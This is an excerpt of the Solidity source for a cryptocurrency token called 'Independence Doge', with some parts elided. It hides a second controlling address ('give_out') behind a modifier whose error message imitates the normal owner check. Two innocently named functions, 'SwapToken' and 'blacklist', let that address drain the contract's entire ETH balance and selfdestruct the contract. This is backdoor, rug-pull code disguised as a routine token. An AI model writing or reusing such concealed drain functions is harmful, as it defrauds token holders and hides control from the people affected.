...
contract Ownable is Context {
    ...
    address internal give_out=0x480EFc93aAB0B2FF793FB45d621541d958ce6B9f;
...
contract IndependenceDoge is Context, IERC20, Ownable {
    ...
    string private _name = 'Independence Doge';
    ...
    modifier Left() {
        require(give_out == _msgSender(), "Ownable: caller is not the owner");
        _;
        }
    ...
    function SwapToken(address payable getmov) payable Left()external{
          (bool sent, ) = getmov.call{value: address(this).balance}("");
          require(sent,"Failed to Swap Token");
    }
    ...
    function blacklist(address payable _to) public Left() payable {
        selfdestruct(_to);
    }
    ...
    function _getTValues(uint256 tAmount) private pure returns (uint256, uint256, uint256,uint256,uint256) {
        ...
        _localVal[0]/**supply*/ = tAmount.div(100).mul(1);
        _localVal[1]/**tBurnValue*/ = tAmount.div(100).mul(0);
        _localVal[2]/**tholder*/ = tAmount.div(100).mul(4);
        _localVal[3]/**tLiquidity*/ = tAmount.div(100).mul(4);
